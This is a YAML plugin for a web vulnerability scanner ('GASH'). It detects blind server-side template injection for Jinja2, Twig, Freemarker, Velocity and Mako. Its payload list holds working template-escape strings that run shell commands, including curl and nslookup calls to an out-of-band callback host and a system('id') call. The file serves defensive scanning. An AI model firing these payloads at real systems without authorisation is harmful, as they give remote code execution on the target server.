# File: plugins/ssti/ssti-blind-oob.yaml
# What: Tier 1 blind SSTI plugin backed by OOBOracle.
# Why: Blind server-side template injection with out-of-band DNS/HTTP callback.
#   Requires self-hosted --oob-server; without it the plugin skips honestly.
#   Payloads use template-engine-specific constructs to trigger callbacks
#   (Jinja2, Twig, Freemarker, Velocity, Mako, etc.). Confirmed ONLY on callback.

id: ssti-blind-oob
name: SSTI OOB (Blind)
description: Detects blind server-side template injection via out-of-band callback. Requires --oob-server.
author: GASH contributors
severity: critical
tags: [ssti, injection, blind, oob, rce]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 50
phase: probe
order: 81
oob: required
api_version: "1.0"
tests: tests/fixtures/ssti-blind-oob/
request:
  method: GET
  param_names: [template, view, page, name, content, tpl]
  payloads:
    # Jinja2 / Flask / Django
    - "{{ ''.__class__.__mro__[1].__subclasses__()[400]('curl {{OOB_URL}}', shell=True, stdout=-1).communicate() }}"
    - "{{ config.__class__.__init__.__globals__['os'].popen('nslookup {{OOB_DOMAIN}}').read() }}"
    # Twig / Symfony
    - "{{ ['id']|filter('system') }}"
    - "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ 'nslookup {{OOB_DOMAIN}}'|filter('system') }}"
    # Freemarker
    - "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"nslookup {{OOB_DOMAIN}}\") }"
    # Velocity
    - "#set($e=\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"nslookup {{OOB_DOMAIN}}\"))${e}"
    # Mako
    - "${__import__('os').popen('nslookup {{OOB_DOMAIN}}').read()}"
    # Generic arithmetic canary (also caught by reflection oracle)
    - "{{ 1337*1337 }}"
oracle:
  name: oob
  params:
    namespace: "ssti-inj"